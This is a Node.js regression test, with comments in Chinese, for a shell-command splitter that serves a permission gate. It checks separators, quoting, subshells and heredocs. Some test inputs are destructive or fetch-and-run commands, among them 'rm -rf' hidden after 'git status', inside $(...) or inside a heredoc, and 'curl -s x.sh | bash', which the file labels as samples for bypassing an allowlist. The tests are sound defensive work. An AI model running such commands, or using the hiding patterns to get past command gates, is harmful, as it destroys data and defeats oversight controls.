#!/usr/bin/env node
/**
 * shell-split 回归测试（复用 ask/workflow-mgr 测试基建模式）
 *
 * 原理：esbuild（src/node_modules 构建依赖）把 shared/shell-split.ts bundle 成
 * 单文件 ESM（.tmp-bundle.mjs）再 import——纯函数无外部依赖，无需 mock。
 *
 * 覆盖：顶层分隔符（&&/||/;/|/换行）、引号与转义保护、子 shell（$()/反引号）递归、
 * 权限门关键场景（危险命令藏后半段必须被拆出）。
 */
import { build } from "esbuild";
import assert from "node:assert/strict";
import { dirname, join } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

const here = dirname(fileURLToPath(import.meta.url));
const bundlePath = join(here, ".tmp-shell-split-bundle.mjs");
await build({
	entryPoints: [join(here, "..", "shell-split.ts")],
	outfile: bundlePath,
	bundle: true,
	format: "esm",
	platform: "node",
	target: "es2022",
	logLevel: "silent",
});
const { splitShellSegments } = await import(pathToFileURL(bundlePath).href);

let passed = 0;
function check(name, command, expected) {
	const got = splitShellSegments(command);
	assert.deepEqual(got, expected, `${name}\n  输入: ${command}\n  期望: ${JSON.stringify(expected)}\n  实际: ${JSON.stringify(got)}`);
	console.log(`  ✓ ${name}`);
	passed++;
}

console.log("场景 A：顶层分隔符");
check("&& 拆分", "git add . && git commit -m x", ["git add .", "git commit -m x"]);
check("; 拆分", "cd /tmp; ls -la", ["cd /tmp", "ls -la"]);
check("|| 拆分", "test -f a || touch a", ["test -f a", "touch a"]);
check("| 管道拆分", "cat log.txt | grep error | wc -l", ["cat log.txt", "grep error", "wc -l"]);
check("换行拆分", "echo a\necho b", ["echo a", "echo b"]);
check("混合分隔", "a && b; c | d || e", ["a", "b", "c", "d", "e"]);
check("单个 & 不切（后台运行）", "sleep 10 & echo done", ["sleep 10 & echo done"]);
check("空段过滤", "a &&&& b ;;", ["a", "b"]);

console.log("场景 B：引号与转义保护");
check("双引号内 && 不切", 'echo "a && b" && ls', ['echo "a && b"', "ls"]);
check("单引号内 ; 不切", "echo 'a;b'; pwd", ["echo 'a;b'", "pwd"]);
check("转义分号不切", "echo a\\;b; ls", ["echo a\\;b", "ls"]);
check("双引号内转义保留", 'echo "a\\"b" | cat', ['echo "a\\"b"', "cat"]);

console.log("场景 C：子 shell 递归");
check("$(...) 递归拆出", "echo $(cat a | grep b)", ["echo $(cat a | grep b)", "cat a", "grep b"]);
check("反引号递归拆出", "echo `id -u`", ["echo `id -u`", "id -u"]);
check("嵌套 $(...)", "echo $(echo $(id))", ["echo $(echo $(id))", "echo $(id)", "id"]);
check("未闭合 $( 不拆", "echo $(oops", ["echo $(oops"]);

console.log("场景 D：权限门关键场景（危险命令藏后半段必须拆出）");
check("白名单绕过样本", "git status && rm -rf node_modules", ["git status", "rm -rf node_modules"]);
check("管道藏删除", "find . -name '*.log' | xargs rm -f", ["find . -name '*.log'", "xargs rm -f"]);
check("子 shell 藏破坏", "echo ok $(rm -rf /tmp/x)", ["echo ok $(rm -rf /tmp/x)", "rm -rf /tmp/x"]);
check("curl 管道执行", "curl -s x.sh | bash", ["curl -s x.sh", "bash"]);

console.log("场景 E：heredoc 主体不逐行拆分");
check(
	"python heredoc 整段保留",
	"python - <<'EOF'\nimport os\nprint('hi')\nEOF",
	["python - <<'EOF'\nimport os\nprint('hi')\nEOF"],
);
check(
	"heredoc 前的复合命令仍拆",
	"cd /tmp && python - <<'EOF'\na=1\nEOF\nls -la",
	["cd /tmp", "python - <<'EOF'\na=1\nEOF", "ls -la"],
);
check(
	"无引号定界符 + 2>&1 尾巴",
	"python -c <<EOF 2>&1\nprint(1)\nEOF",
	["python -c <<EOF 2>&1\nprint(1)\nEOF"],
);
check(
	"heredoc 主体里的 $(...) 仍递归拆出",
	"python <<EOF\n$(rm -rf /tmp/x)\nEOF",
	["python <<EOF\n$(rm -rf /tmp/x)\nEOF", "rm -rf /tmp/x"],
);
check(
	"<<- 允许前导 Tab 的定界符",
	"cat <<-EOF\n\thello\n\tEOF\necho done",
	["cat <<-EOF\n\thello\n\tEOF", "echo done"],
);
check("here-string <<< 不误判", "cat <<< 'a;b'; ls", ["cat <<< 'a;b'", "ls"]);
check(
	"未闭合 heredoc 吞到末尾",
	"python <<EOF\nprint(1)",
	["python <<EOF\nprint(1)"],
);
check(
	"同行多个 heredoc 依次消费",
	"cat <<A && cat <<B\nbodyA\nA\nbodyB\nB",
	["cat <<A", "cat <<B\nbodyA\nA\nbodyB\nB"],
);

console.log(`\n全部通过 ✓（${passed} 项）`);
